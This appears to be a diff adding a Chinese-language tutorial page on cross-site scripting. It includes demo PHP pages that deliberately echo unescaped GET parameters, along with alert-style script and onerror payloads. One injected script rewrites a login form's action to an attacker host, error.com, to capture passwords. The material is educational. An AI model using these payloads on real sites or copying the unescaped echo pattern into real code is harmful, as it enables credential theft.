@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<title>XSS</title>
+	<link rel="stylesheet" href="../../css/normalize.css">
+	<link rel="stylesheet" href="../../css/styles/agate.css">
+	<link rel="stylesheet" href="../../css/dark.css">
+	<script src="../../js/jquery-3.2.1-compressed.js"></script>
+	<script src="../../js/highlight.pack.js"></script>
+	<script src="../../js/index.min.js"></script>
+</head>
+
+<body>
+	<aside id="sidebar">
+		<section id="catalog">
+			<img id="hideCatalog" src="../../images/catalog.png" alt="加载失败">
+			目录
+		</section>
+	</aside>
+	<div id="showCatalog">
+		<img src="../../images/arrow.png">
+	</div>
+	<article id="container">
+		<hgroup>
+			<h1 id="title">XSS</h1>
+		</hgroup>
+		<section>
+			<h2>定义</h2>
+			<p>
+				XSS（Cross-site
+				scripting，跨站脚本）是一种网站应用程序的安全漏洞攻击，是代码注入的一种<sup>[1]</sup>。其原理是用户输入的数据未经转义直接在网页上显示，攻击者可以根据网页漏洞在网页上直接运行脚本（通常是
+				Javascript），进而改变页面结构、窃取他人隐私（Cookie）等。
+			</p>
+		</section>
+		<section>
+			<h2>静态资源</h2>
+			<p>
+				在 HTML 页面（静态资源）中，有时候需要将用户输入的信息显示在页面上，如果通过 innerHTML 直接进行输出显示：<a href="../../demo/xss_demo.html">点击试一试</a>
+				<figure>
+					<img src="../../images/xss_normal_input.jpg" alt="加载失败">
+					<figcaption class="description">正常输入</figcaption>
+					<img src="../../images/xss_innormal_input.jpg" alt="加载失败">
+					<figcaption class="description">非正常输入</figcaption>
+				</figure>
+				用户输入的标签也会被当做 HTML 标签渲染出来，我们通常不希望进行这样的操作，此时就需要对用户输入的内容进行转移。不过，所幸的是，在自身页面进行 DOM 操作不能直接运行脚本。例如在文本框内输入<span
+					class="definition"> &lt;script&gt;alert('hello world');&lt;/script&gt; </span>。
+				<figure>
+					<img src="../../images/xss_html_script.jpg" alt="加载失败">
+					<figcaption class="description">已写入文本，但页面不会弹窗（执行脚本）</figcaption>
+				</figure>
+				但可以换另一种方式来执行脚本代码，插入一个图片标签，设置错误的 src 导致触发 onerror 事件。此处添加的是<span class="definition"> &lt;img src=1
+					onerror=alert(1)&gt; </span>
+				<figure>
+					<img src="../../images/xss_img_error.jpg" alt="加载失败">
+				</figure>
+			</p>
+		</section>
+		<section>
+			<h2>动态资源</h2>
+			<p>
+				在一些动态资源（php、python、asp 等语言等编写的页面）中，代码在构建页面的时候，如果直接使用用户输入的信息，不仅允许了用户自定义页面的结构，当输入的内容带有脚本语言的时候，还会执行这些脚本。下面是<a
+					href="../../demo/check.php"> check.php </a>代码，使用 php 语言直接将 GET 方法传递过来键名为 content 的键输出到页面。
+				<pre><code class="php">
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+	&lt;meta charset="UTF-8"&gt;
+	&lt;title&gt;xss demo&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;div id="container"&gt;
+		&lt;?php
+		echo $_GET['content'];
+		 ?&gt;
+	&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+				</code></pre>
+				如果在 check.php 后面追加<span class="definition"> ?content=&lt;script&gt;alert(1);&lt;/script&gt; </span>
+				<figure>
+					<img src="../../images/xss_chrome.jpg" alt="加载失败">
+					<figcaption class="description">chrome 浏览器，umm....</figcaption>
+					<img src="../../images/xss_ie.jpg" alt="加载失败">
+					<figcaption class="description">ie 浏览器</figcaption>
+				</figure>
+				只是弹窗也许危害不大，但如果某网站设计时有漏洞，就可以通过这个漏洞修改网站，进而诱导其他人以为是正常的网站，用户在不知情的情况下可能将隐私信息暴露给攻击者。假设有个XX网（可信任网站）的<a
+					href="../../demo/login_demo.php">登录页面</a>。
+				<pre><code class="php">
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+	&lt;meta charset="UTF-8"&gt;
+	&lt;title&gt;Document&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;div&gt;
+		&lt;?php
+			if (isset($_GET['username'])) {
+				echo '欢迎您，尊敬的' . $_GET['username'] . '，请登录';
+			}
+		 ?&gt;
+	&lt;/div&gt;
+	&lt;form id="form" action="login_demo.php" method="get"&gt;
+		&lt;div&gt;
+			用户名：
+			&lt;input type="text" name="username"&gt;
+		&lt;/div&gt;
+		&lt;div&gt;
+			密码：
+			&lt;input type="password" name="password"&gt;
+		&lt;/div&gt;
+		&lt;div&gt;
+			&lt;input type="submit" value="登录"&gt;
+			&lt;input type="button" value="注册"&gt;
+		&lt;/div&gt;
+	&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+				</code></pre>
+				<figure>
+					<img src="../../images/xss_login_page.jpg" alt="加载失败">
+					<figcaption class="description">简单的登录页</figcaption>
+				</figure>
+				该网站的设计者出于某种原因将 usernamer 的键值直接显示在页面，攻击者可以在 URL 后追加<span
+					class="definition">?username=用户&lt;script&gt;window.onload = function(){ var form =
+					document.getElementById('form'); form.action = 'http://error.com'; }&lt;/script&gt;</span>。
+				<figure>
+					<img src="../../images/xss_becheat.jpg">
+					<figcaption class="description">诱导用户点击 URL </figcaption>
+				</figure>
+				<figure>
+					<img src="../../images/xss_login_demo.jpg" alt="加载失败">
+					<figcaption class="description">被更改后的目的地址</figcaption>
+				</figure>
+				<span class="definition"> http://error.com </span>是攻击者自己的网站，在 URL 后追加这段文字后，将该 URL
+				转发给其他用户，不知情的用户点击后，表面上网页还是正常运转，实际上 javascript 代码已经将表单提交的目的地址从<span class="definition"> login_demo.php
+				</span>更改为<span class="definition"> http://error.com </span>，用户输入的账号和密码进行登录时就会将其一并传送给攻击者的服务器。
+			</p>
+		</section>
+		<section class="refer">
+			<h2>参考文献</h2>
+			<p>
+				<div>[1] 维基百科 跨站脚本 <a
+						href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC</a>
+				</div>
+			</p>
+		</section>
+	</article>
+</body>
+
+</html>
